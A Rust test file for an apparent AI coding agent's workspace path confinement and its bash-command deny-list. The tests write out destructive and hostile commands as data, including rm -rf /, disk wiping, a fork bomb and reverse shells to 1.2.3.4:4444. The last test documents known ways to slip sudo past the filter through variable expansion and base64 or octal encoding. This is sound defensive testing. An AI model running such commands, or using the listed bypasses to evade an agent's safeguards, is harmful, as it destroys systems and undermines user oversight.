use super::*;

// ─── resolve_under_cwd ───────────────────────────────────────────────

#[test]
fn resolve_under_cwd_relative_path() {
    let cwd = temp_workspace("resolve-rel");
    fs::write(cwd.join("hello.txt"), "hi").unwrap();
    let res = resolve_under_cwd(&cwd, "hello.txt");
    assert!(res.is_ok());
    assert!(res.unwrap().ends_with("hello.txt"));
}

#[test]
fn resolve_under_cwd_absolute_under_workspace() {
    let cwd = temp_workspace("resolve-abs");
    let file = cwd.join("sub").join("file.txt");
    fs::create_dir_all(file.parent().unwrap()).unwrap();
    fs::write(&file, "content").unwrap();
    let res = resolve_under_cwd(&cwd, file.to_str().unwrap());
    assert!(res.is_ok());
}

#[test]
fn resolve_under_cwd_rejects_escape() {
    let cwd = temp_workspace("resolve-escape");
    let res = resolve_under_cwd(&cwd, "/etc/passwd");
    assert!(res.is_err());
}

#[test]
fn resolve_under_cwd_rejects_dotdot_escape() {
    let cwd = temp_workspace("resolve-dotdot");
    let sibling = cwd.parent().unwrap().join(format!(
        "sibling-{}",
        cwd.file_name().unwrap().to_string_lossy()
    ));
    fs::create_dir_all(&sibling).unwrap();
    fs::write(sibling.join("secret.txt"), "x").unwrap();
    let rel = format!(
        "../{}/secret.txt",
        sibling.file_name().unwrap().to_string_lossy()
    );
    let res = resolve_under_cwd(&cwd, &rel);
    assert!(res.is_err());
}

// ─── validate_bash_command ───────────────────────────────────────────

#[test]
fn bash_allows_safe_commands() {
    assert!(validate_bash_command("ls -la").is_ok());
    assert!(validate_bash_command("cat foo.txt").is_ok());
    assert!(validate_bash_command("cargo build").is_ok());
    assert!(validate_bash_command("echo hello world").is_ok());
    assert!(validate_bash_command("git status").is_ok());
    assert!(validate_bash_command("find . -name '*.rs'").is_ok());
}

#[test]
fn bash_denies_rm_rf_root() {
    assert!(validate_bash_command("rm -rf /").is_err());
    assert!(validate_bash_command("rm -fr /").is_err());
    assert!(validate_bash_command("rm -rf --no-preserve-root /").is_err());
}

#[test]
fn bash_denies_sudo() {
    assert!(validate_bash_command("sudo apt install").is_err());
    assert!(validate_bash_command("doas cat /etc/shadow").is_err());
}

#[test]
fn bash_denies_privilege_escalation() {
    assert!(validate_bash_command("su -c whoami").is_err());
    assert!(validate_bash_command("su root").is_err());
    assert!(validate_bash_command("pkexec bash").is_err());
}

#[test]
fn bash_denies_disk_destruction() {
    assert!(validate_bash_command("mkfs.ext4 /dev/sda").is_err());
    assert!(validate_bash_command("dd if=/dev/zero of=/dev/sda").is_err());
    assert!(validate_bash_command("fdisk /dev/sda").is_err());
    assert!(validate_bash_command("wipefs -a /dev/sda").is_err());
}

#[test]
fn bash_denies_system_shutdown() {
    assert!(validate_bash_command("shutdown -h now").is_err());
    assert!(validate_bash_command("reboot").is_err());
    assert!(validate_bash_command("init 0").is_err());
    assert!(validate_bash_command("systemctl poweroff").is_err());
    assert!(validate_bash_command("halt").is_err());
}

#[test]
fn bash_denies_fork_bomb() {
    assert!(validate_bash_command(":(){ :|:& };:").is_err());
}

#[test]
fn bash_denies_reverse_shells() {
    assert!(validate_bash_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").is_err());
    assert!(validate_bash_command("nc -e /bin/sh 1.2.3.4 4444").is_err());
}

#[test]
fn bash_denies_kernel_modules() {
    assert!(validate_bash_command("insmod evil.ko").is_err());
    assert!(validate_bash_command("modprobe evil").is_err());
    assert!(validate_bash_command("rmmod module").is_err());
}

#[test]
fn bash_denies_overwriting_critical_files() {
    assert!(validate_bash_command("echo x > /etc/passwd").is_err());
    assert!(validate_bash_command("echo x > /etc/shadow").is_err());
    assert!(validate_bash_command("echo x > /dev/sda").is_err());
}

#[test]
fn bash_denies_iptables_flush() {
    assert!(validate_bash_command("iptables -f").is_err());
    assert!(validate_bash_command("iptables --flush").is_err());
}

#[test]
fn bash_normalizes_whitespace_for_deny() {
    // Extra spaces shouldn't bypass the deny list
    assert!(validate_bash_command("sudo  apt  install").is_err());
    assert!(validate_bash_command("rm  -rf  /").is_err());
}

#[test]
fn bash_strips_quotes_and_backslashes_for_deny() {
    // The deny-list check strips quote/backslash characters before matching, so
    // splitting a denied word across a shell-syntax boundary doesn't bypass it.
    assert!(validate_bash_command("s\\udo apt install").is_err());
    assert!(validate_bash_command("s\"u\"do apt install").is_err());
    assert!(validate_bash_command("'sudo' apt install").is_err());
    assert!(validate_bash_command("s'u'do apt install").is_err());
}

#[test]
fn bash_deny_list_is_bypassable_by_variable_expansion_and_encoding() {
    // Known, deliberate gaps: `validate_bash_command` is a substring deny-list, not a
    // shell parser, so it does not understand variable expansion or command
    // substitution/encoding. These commands run `sudo`-equivalent actions but are
    // *not* caught — the real safety boundary for `bash` is the approval prompt in
    // `crate::agent::approval::ApprovalGate`, which shows the user the raw command
    // before it runs. If the deny-list is ever hardened to catch one of these, flip
    // the assertion here to `is_err()` as a regression signal that it now works.
    assert!(validate_bash_command("S=sudo; $S apt install").is_ok());
    assert!(validate_bash_command("$(echo c3VkbyBhcHQgaW5zdGFsbA== | base64 -d)").is_ok());
    assert!(validate_bash_command("$(printf '\\163\\165\\144\\157') apt install").is_ok());
}
